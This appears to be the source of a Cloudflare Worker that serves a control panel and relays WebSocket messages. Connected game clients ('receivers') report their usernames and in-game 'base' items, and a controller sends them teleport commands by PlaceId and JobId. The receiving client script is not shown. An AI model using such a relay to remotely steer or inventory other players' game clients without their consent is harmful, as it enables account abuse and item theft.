import { DurableObject } from "cloudflare:workers";

const RECEIVER_PATH = "/ws1";
const SENDER_PATH = "/ws2";
const ROOM_NAME = "global";

const CONTROL_PANEL_HTML = String.raw`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>TP WebSocket Control</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#080808;color:#f5f5f5;font-family:Arial,Helvetica,sans-serif}
    .wrap{max-width:980px;margin:0 auto;padding:22px}
    .top{display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap;margin-bottom:18px}
    h1{font-size:24px;margin:0}
    .status{font-size:13px;color:#aaa}
    .grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:16px}
    .card{background:#111;border:1px solid #292929;border-radius:14px;padding:16px}
    .card h2{margin:0 0 12px;font-size:16px}
    .fields{display:grid;gap:10px}
    label{font-size:12px;color:#aaa;font-weight:700}
    input{width:100%;border:1px solid #333;border-radius:9px;background:#191919;color:#fff;padding:12px;font-size:15px;outline:none}
    input:focus{border-color:#777}
    button{border:0;border-radius:9px;padding:11px 14px;font-weight:700;cursor:pointer}
    .primary{background:#f1f1f1;color:#090909}
    .dark{background:#242424;color:#fff}
    .players{display:grid;gap:8px}
    .player{width:100%;text-align:left;background:#1b1b1b;color:#fff;border:1px solid #2d2d2d}
    .player.selected{border-color:#eee;background:#252525}
    .player .sub{display:block;color:#999;font-size:12px;margin-top:3px}
    .items{display:grid;gap:7px;margin-top:10px}
    .item{background:#191919;border-radius:8px;padding:9px 10px}
    .item .extra{display:block;color:#aaa;font-size:12px;margin-top:3px}
    .empty{color:#888;font-size:13px;padding:8px 0}
    .actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
    .selected-title{font-weight:700;margin-bottom:8px}
    .note{font-size:12px;color:#888;margin-top:10px}
    @media(max-width:700px){.grid{grid-template-columns:1fr}.wrap{padding:14px}}
  </style>
</head>
<body>
  <main class="wrap">
    <div class="top">
      <h1>TP WebSocket Control</h1>
      <div id="status" class="status">Connecting...</div>
    </div>

    <div class="grid">
      <section class="card">
        <h2>Connected receivers</h2>
        <div id="players" class="players">
          <div class="empty">Waiting for receivers...</div>
        </div>
      </section>

      <section class="card">
        <h2>Teleport</h2>
        <div id="selected" class="selected-title">No receiver selected</div>

        <div class="fields">
          <div>
            <label for="placeId">PlaceId</label>
            <input id="placeId" inputmode="numeric" placeholder="Enter PlaceId">
          </div>
          <div>
            <label for="jobId">JobId</label>
            <input id="jobId" placeholder="Enter JobId">
          </div>
        </div>

        <div class="actions">
          <button id="teleport" class="primary" type="button">Teleport Selected</button>
        </div>

        <div class="note">The site auto-updates the receiver list and base contents.</div>

        <h2 style="margin-top:18px">Selected receiver's base</h2>
        <div id="items" class="items">
          <div class="empty">Select a receiver to view their base.</div>
        </div>
      </section>
    </div>
  </main>

  <script>
    (function(){
      var statusEl = document.getElementById("status");
      var playersEl = document.getElementById("players");
      var selectedEl = document.getElementById("selected");
      var itemsEl = document.getElementById("items");
      var placeInput = document.getElementById("placeId");
      var jobInput = document.getElementById("jobId");
      var teleportButton = document.getElementById("teleport");

      var socket = null;
      var players = [];
      var selectedUsername = null;

      function esc(value) {
        return String(value == null ? "" : value)
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#039;");
      }

      function currentSelected() {
        for (var i = 0; i < players.length; i++) {
          if (String(players[i].username).toLowerCase() === String(selectedUsername || "").toLowerCase()) {
            return players[i];
          }
        }
        return null;
      }

      function renderItems() {
        var info = currentSelected();

        if (!info) {
          selectedEl.textContent = "No receiver selected";
          itemsEl.innerHTML = '<div class="empty">Select a receiver to view their base.</div>';
          return;
        }

        selectedEl.textContent = (info.displayName || info.username) + "  @" + info.username;

        var items = Array.isArray(info.items) ? info.items : [];
        if (!items.length) {
          itemsEl.innerHTML = '<div class="empty">No base brainrots detected.</div>';
          return;
        }

        var html = "";
        for (var i = 0; i < items.length; i++) {
          var item = items[i] || {};
          var name = typeof item === "string" ? item : (item.name || "Unknown");
          var extra = typeof item === "object" && item.extra ? item.extra : "";
          html += '<div class="item"><strong>' + esc(name) + '</strong>' +
            (extra ? '<span class="extra">' + esc(extra) + '</span>' : '') +
            '</div>';
        }
        itemsEl.innerHTML = html;
      }

      function renderPlayers() {
        if (!players.length) {
          playersEl.innerHTML = '<div class="empty">No receivers connected.</div>';
          renderItems();
          return;
        }

        var html = "";
        for (var i = 0; i < players.length; i++) {
          var p = players[i];
          var selectedClass = String(p.username).toLowerCase() === String(selectedUsername || "").toLowerCase()
            ? " selected"
            : "";
          html += '<button class="player' + selectedClass + '" type="button" data-user="' + esc(p.username) + '">' +
            esc(p.displayName || p.username) +
            '<span class="sub">@' + esc(p.username) + ' · ' +
            (Array.isArray(p.items) ? p.items.length : 0) + ' base item(s)</span></button>';
        }
        playersEl.innerHTML = html;

        var buttons = playersEl.querySelectorAll("button[data-user]");
        for (var j = 0; j < buttons.length; j++) {
          buttons[j].addEventListener("click", function(){
            selectedUsername = this.getAttribute("data-user");
            renderPlayers();
            renderItems();
          });
        }

        if (selectedUsername && !currentSelected()) {
          selectedUsername = null;
        }

        renderItems();
      }

      function send(data) {
        if (!socket || socket.readyState !== WebSocket.OPEN) {
          statusEl.textContent = "WebSocket is not connected";
          return false;
        }

        socket.send(JSON.stringify(data));
        return true;
      }

      function requestPlayers() {
        send({ type: "list" });
      }

      function connect() {
        var scheme = location.protocol === "https:" ? "wss:" : "ws:";
        socket = new WebSocket(scheme + "//" + location.host + "/ws2");

        socket.addEventListener("open", function(){
          statusEl.textContent = "Connected · auto updating";
          requestPlayers();
        });

        socket.addEventListener("message", function(event){
          var data;
          try {
            data = JSON.parse(event.data);
          } catch (_) {
            return;
          }

          if (data.type === "connected") {
            statusEl.textContent = "Connected · auto updating";
            requestPlayers();
            return;
          }

          if (data.type === "players") {
            players = Array.isArray(data.players) ? data.players : [];
            renderPlayers();
            statusEl.textContent = players.length + " receiver(s) online · auto updating";
            return;
          }

          if (data.type === "sent") {
            if ((Number(data.receivers) || 0) > 0) {
              statusEl.textContent = "Teleport sent to @" + (data.target || selectedUsername || "?");
            } else {
              statusEl.textContent = "Receiver is no longer online";
              requestPlayers();
            }
            return;
          }

          if (data.type === "error") {
            statusEl.textContent = data.error || "Server error";
          }
        });

        socket.addEventListener("close", function(){
          statusEl.textContent = "Disconnected · reconnecting...";
          setTimeout(connect, 2000);
        });

        socket.addEventListener("error", function(){
          statusEl.textContent = "WebSocket error";
        });
      }

      teleportButton.addEventListener("click", function(){
        var info = currentSelected();
        if (!info) {
          statusEl.textContent = "Select a receiver first";
          return;
        }

        var placeId = Number(String(placeInput.value || "").trim());
        var jobId = String(jobInput.value || "").trim();

        if (!Number.isSafeInteger(placeId) || placeId <= 0) {
          statusEl.textContent = "Enter a valid PlaceId";
          return;
        }

        if (!jobId) {
          statusEl.textContent = "Enter a JobId";
          return;
        }

        statusEl.textContent = "Sending teleport to @" + info.username;

        send({
          type: "join",
          target: info.username,
          placeId: placeId,
          jobId: jobId
        });
      });

      setInterval(requestPlayers, 3000);
      connect();
    })();
  </script>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === "/") {
      return new Response(CONTROL_PANEL_HTML, {
        headers: {
          "content-type": "text/html; charset=UTF-8",
          "cache-control": "no-store",
        },
      });
    }

    if (url.pathname === "/health") {
      return Response.json({
        ok: true,
        service: "tp-websocket",
        receiver: RECEIVER_PATH,
        sender: SENDER_PATH,
      });
    }

    if (url.pathname !== RECEIVER_PATH && url.pathname !== SENDER_PATH) {
      return new Response("Not found", { status: 404 });
    }

    if (request.headers.get("Upgrade")?.toLowerCase() !== "websocket") {
      return new Response("Expected WebSocket upgrade", { status: 426 });
    }

    const id = env.TP_RELAY.idFromName(ROOM_NAME);
    return env.TP_RELAY.get(id).fetch(request);
  },
};

export class TriggerRoom extends DurableObject {
  constructor(ctx, env) {
    super(ctx, env);
    this.ctx = ctx;
  }

  async fetch(request) {
    const url = new URL(request.url);

    let role;
    if (url.pathname === RECEIVER_PATH) {
      role = "receiver";
    } else if (url.pathname === SENDER_PATH) {
      role = "sender";
    } else {
      return new Response("Not found", { status: 404 });
    }

    if (request.headers.get("Upgrade")?.toLowerCase() !== "websocket") {
      return new Response("Expected WebSocket upgrade", { status: 426 });
    }

    const pair = new WebSocketPair();
    const [client, server] = Object.values(pair);

    this.ctx.acceptWebSocket(server, [role]);
    server.serializeAttachment({ role });

    server.send(JSON.stringify({
      type: "connected",
      role,
    }));

    return new Response(null, {
      status: 101,
      webSocket: client,
    });
  }

  async webSocketMessage(ws, message) {
    if (typeof message !== "string") {
      this.safeSend(ws, { type: "error", error: "Text JSON messages only" });
      return;
    }

    let data;
    try {
      data = JSON.parse(message);
    } catch {
      this.safeSend(ws, { type: "error", error: "Invalid JSON" });
      return;
    }

    const attachment = ws.deserializeAttachment() || {};
    const role = attachment.role;

    if (role === "receiver") {
      if (data?.type !== "register" && data?.type !== "update") {
        return;
      }

      const username = this.cleanText(data.username, 40);
      const displayName = this.cleanText(data.displayName || data.username, 60);
      const items = this.cleanItems(data.items);

      if (!username) {
        this.safeSend(ws, { type: "error", error: "Missing username" });
        return;
      }

      ws.serializeAttachment({
        role: "receiver",
        username,
        usernameLower: username.toLowerCase(),
        displayName,
        items,
      });

      this.safeSend(ws, {
        type: "registered",
        username,
        items: items.length,
      });

      this.broadcastPlayers();
      return;
    }

    if (role !== "sender") {
      return;
    }

    if (data?.type === "list") {
      this.sendPlayers(ws);
      return;
    }

    if (data?.type !== "join") {
      this.safeSend(ws, { type: "error", error: "Expected type=list or type=join" });
      return;
    }

    const placeId = Number(data.placeId);
    const jobId = String(data.jobId ?? "").trim();
    const target = this.cleanText(data.target, 40).toLowerCase();

    if (!Number.isSafeInteger(placeId) || placeId <= 0) {
      this.safeSend(ws, { type: "error", error: "Invalid placeId" });
      return;
    }

    if (!jobId || jobId.length > 200) {
      this.safeSend(ws, { type: "error", error: "Invalid jobId" });
      return;
    }

    const payload = JSON.stringify({
      type: "join",
      placeId,
      jobId,
      target: target || null,
    });

    let delivered = 0;

    for (const receiver of this.ctx.getWebSockets("receiver")) {
      const info = receiver.deserializeAttachment() || {};

      if (target && info.usernameLower !== target) {
        continue;
      }

      try {
        receiver.send(payload);
        delivered += 1;
      } catch {
        // Socket closed before send.
      }
    }

    this.safeSend(ws, {
      type: "sent",
      receivers: delivered,
      target: target || null,
    });
  }

  async webSocketClose(ws) {
    const info = ws.deserializeAttachment() || {};
    if (info.role === "receiver") {
      this.broadcastPlayers();
    }
  }

  async webSocketError(ws) {
    const info = ws.deserializeAttachment() || {};
    if (info.role === "receiver") {
      this.broadcastPlayers();
    }
  }

  cleanText(value, maxLength) {
    if (typeof value !== "string") return "";
    return value.trim().slice(0, maxLength);
  }

  cleanItems(value) {
    if (!Array.isArray(value)) return [];

    const out = [];
    const seen = new Set();

    for (const raw of value) {
      let name = "";
      let extra = "";

      if (typeof raw === "string") {
        name = raw.trim();
      } else if (raw && typeof raw === "object") {
        name = String(raw.name ?? "").trim();
        extra = String(raw.extra ?? "").trim();
      }

      if (!name) continue;

      name = name.slice(0, 80);
      extra = extra.slice(0, 120);

      const key = (name + "\0" + extra).toLowerCase();
      if (seen.has(key)) continue;
      seen.add(key);

      out.push(extra ? { name, extra } : { name });
      if (out.length >= 100) break;
    }

    return out;
  }

  playerList() {
    const players = [];

    for (const receiver of this.ctx.getWebSockets("receiver")) {
      const info = receiver.deserializeAttachment() || {};
      if (!info.username) continue;

      players.push({
        username: info.username,
        displayName: info.displayName || info.username,
        items: Array.isArray(info.items) ? info.items : [],
      });
    }

    players.sort((a, b) =>
      a.username.toLowerCase().localeCompare(b.username.toLowerCase())
    );

    return players;
  }

  sendPlayers(ws) {
    this.safeSend(ws, {
      type: "players",
      players: this.playerList(),
    });
  }

  broadcastPlayers() {
    const payload = JSON.stringify({
      type: "players",
      players: this.playerList(),
    });

    for (const sender of this.ctx.getWebSockets("sender")) {
      try {
        sender.send(payload);
      } catch {
        // Socket closed before update.
      }
    }
  }

  safeSend(ws, data) {
    try {
      ws.send(JSON.stringify(data));
    } catch {
      // Socket closed before reply.
    }
  }
}
